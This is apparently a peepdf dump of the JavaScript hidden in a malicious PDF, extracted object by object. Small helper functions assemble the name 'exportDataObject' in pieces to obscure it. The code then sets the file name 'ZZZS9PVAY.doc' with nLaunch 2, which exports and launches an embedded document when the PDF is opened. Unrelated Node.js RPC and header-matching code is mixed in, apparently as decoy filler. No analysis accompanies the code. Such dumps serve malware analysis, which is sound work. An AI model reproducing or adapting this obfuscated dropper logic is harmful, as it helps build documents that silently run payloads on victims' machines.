// peepdf comment: Javascript code located in object 20 (version 0)

function re0(nn) {
    return 'abcdefghijklmnopqrst'.charAt(nn);
}

// peepdf comment: Javascript code located in object 21 (version 0)

var module_proxy1 = function(spec, my) {
        var _super = {};
        my = my || {};
        spec = spec || {};
        my.name = spec.name || 'INVALID';
        my.send_message = spec.send_message;
        my.rpc_calls = {};
        var call; /* call(name, args, cb_); */
        var rpc_reply; /* rpc_reply(err,res); */
        var that = new events.EventEmitter(); /****************************************************************************/
        /* PROTECTED METHODS */
        /****************************************************************************/
        rpc_reply = function(oid, err, res) {
            if (my.rpc_calls[oid]) {
                my.rpc_calls[oid](err, res);
                delete my.rpc_calls[oid];
            }
        }; /****************************************************************************/
        /* PUBLIC METHODS */
        /****************************************************************************/
        call = function(proc, args, cb_) {
            if (my.name === 'INVALID' || my.name === '__ALL__') {
                return cb_(common.err('Cannot use `call` on the wildcard proxy', 'breach_module:call_on_wildcard'));
            }
            var msg = {
                hdr: {
                    typ: 'rpc_call'
                },
                dst: my.name,
                prc: proc,
                arg: args
            };
            var mid = my.send_message(msg);
            my.rpc_calls[mid] = cb_;
            return mid;
        };
        common.method(that, 'rpc_reply', rpc_reply, _super);
        common.method(that, 'call', call, _super);
        return that;
    };

// peepdf comment: Javascript code located in object 23 (version 0)

var ahod = "xportDat";

function Abyss() {
    return ahod + re0(0);
};

// peepdf comment: Javascript code located in object 24 (version 0)

function Walker() {
    if (ahod) {
        return re0(4) + Abyss();
    }
};

// peepdf comment: Javascript code located in object 25 (version 0)

var c = {};
c['cName'] = 'ZZZS9PVAY.doc';

// peepdf comment: Javascript code located in object 26 (version 0)

var doH = Walker();

// peepdf comment: Javascript code located in object 27 (version 0)

var dipole = this[doH + 'Object'];

// peepdf comment: Javascript code located in object 28 (version 0)

function wgetNow8() {
    c['n' + 'Launch'] = 2;
};

// peepdf comment: Javascript code located in object 29 (version 0)

function matchHeaders(httpObj, headers) {
    return Object.keys(headers).every(function(key) {
        const rule = headers[key]
        const value = (httpObj.headers || httpObj._headers || {})[key.toLowerCase()]

        if (typeof rule === 'boolean') {
            return rule ? value != null : value == null
        }

        if (isRegExp(rule)) {
            return rule.test(value)
        }

        if (typeof rule === 'string') {
            return new RegExp(rule, 'i').test(value)
        }

        if (typeof rule === 'function') {
            return rule(value, key)
        }

        return false
    })
};

// peepdf comment: Javascript code located in object 31 (version 0)

var module2 = function(spec, my) {
        var _super = {};
        my = my || {};
        spec = spec || {};
        my.VERSION = require('./../package.json').version;
        my.proxies = {};
        my.procedures = {};
        my.message_id = 0;
        var emit; /* emit(type, event); */
        var register; /* register(source, type); */
        var unregister; /* register(rid); */
        var expose; /* expose(name, proc(src, args, cb_(err, res))); */
        var remove; /* remove(name); */
        var module; /* module(name); */
        var init; /* init(cb_); */
        var send_message; /* send_message(msg); */
        var handle_message; /* handle_message(msg); */
        var that = {}; /****************************************************************************/
        /* MESSAGE HANDLING */
        /****************************************************************************/
        handle_message = function(msg) {
            if (!msg || !msg.hdr || typeof msg.hdr.typ !== 'string' || typeof msg.hdr.mid !== 'number' || typeof msg.hdr.src !== 'string') { /* We ignore the message. */
                return;
            }
            switch (msg.hdr.typ) { /* `event` messages are received when the module actually registered    */
                /* for this event class. We trust the core module code for registration */
                /* correctness and just emit that event on the associated module        */
                /* object.                                                              */
            case 'event':
                {
                    if (my.proxies[msg.hdr.src]) {
                        my.proxies[msg.hdr.src].emit(msg.typ, msg.evt);
                    }
                    if (my.proxies['__ALL__']) {
                        my.proxies['__ALL__'].emit(msg.typ, msg.evt);
                    }
                    break;
                } /* `rpc_call` messages are received when an other module wants to call  */
                /* a local procedure previously exposed.                                */
            case 'rpc_call':
                { /* This is an helper function to reply to an `rpc_call` message. It */
                    /* sets up the headers and store the error or result.              */
                    var rpc_reply = function(err, result) {
                            msg.oid = msg.hdr.mid;
                            delete msg.hdr.mid;
                            msg.hdr.typ = 'rpc_reply';
                            msg.dst = msg.hdr.src;
                            delete msg.hdr.src;
                            if (err) {
                                msg.err = {
                                    nme: err.name,
                                    msg: err.message
                                };
                            } else {
                                msg.res = result;
                            }
                            send_message(msg);
                        };
                    if (my.procedures[msg.prc]) {
                        my.procedures[msg.prc](msg.hdr.src, msg.arg, rpc_reply);
                    } else {
                        rpc_reply(common.err('Procedure unknown: `' + msg.prc, 'breach_module:procedure_unknown'));
                    }
                    break;
                } /* `rpc_reply` messages are received when an `rpc_call` was previously  */
                /* sent and has received an answer.                                     */
            case 'rpc_reply':
                {
                    if (my.proxies[msg.hdr.src]) {
                        var err = null;
                        if (msg.err) {
                            err = common.err(msg.err.msg, msg.err.nme);
                        }
                        my.proxies[msg.hdr.src].rpc_reply(msg.oid, err, msg.res);
                    }
                    break;
                }
            }
        };
        send_message = function(msg) {
            if (!msg || !msg.hdr || typeof msg.hdr.typ !== 'string') { /* We ignore the message. */
                return;
            }
            var mid = ++my.message_id;
            msg.hdr.mid = mid;
            msg.hdr.ver = my.VERSION;
            process.send(msg);
            return mid;
        }; /****************************************************************************/
        /* PUBLIC METHODS */
        /****************************************************************************/
        emit = function(type, event) {
            var msg = {
                hdr: {
                    typ: 'event'
                },
                typ: type,
                evt: event
            };
            return send_message(msg);
        };
        register = function(source, type) {
            var msg = {
                hdr: {
                    typ: 'register'
                },
                src: source || '.*',
                typ: type || '.*'
            };
            return send_message(msg);
        };
        unregister = function(rid) {
            var msg = {
                hdr: {
                    typ: 'unregister'
                },
                rid: rid
            };
            return send_message(msg);
        };
        expose = function(name, proc) {
            console.log('EXPOSED: ' + name);
            my.procedures[name] = proc;
        };
        remove = function(name) {
            delete my.procedures[name];
        };
        module = function(name) {
            if (!name) {
                name = '__ALL__';
            }
            if (!my.proxies[name]) {
                my.proxies[name] = module_proxy({
                    name: name,
                    send_message: send_message
                });
            }
            return my.proxies[name];
        };
        init = function(cb_) { /* Dummy `init` and `kill` procedures that should be overwritten by the */
            /* module implementation.                                              */
            that.expose('init', function(src, args, cb_) {
                return cb_();
            });
            that.expose('kill', function(src, args, cb_) {
                process.nextTick(function() {
                    process.exit(0);
                });
                return cb_();
            });
            process.on('message', function(msg) {
                handle_message(msg);
            });
            process.nextTick(function() {
                that.emit('internal:ready', {
                    ver: my.VERSION
                });
            });
            return cb_();
        };
        common.method(that, 'emit', emit, _super);
        common.method(that, 'register', register, _super);
        common.method(that, 'unregister', unregister, _super);
        common.method(that, 'expose', expose, _super);
        common.method(that, 'remove', remove, _super);
        common.method(that, 'module', module, _super);
        common.method(that, 'init', init, _super);
        return that;
    };

// peepdf comment: Javascript code located in object 33 (version 0)

function Ashe() {
    wgetNow8();
};

// peepdf comment: Javascript code located in object 40 (version 0)

Ashe();
dipole(c);

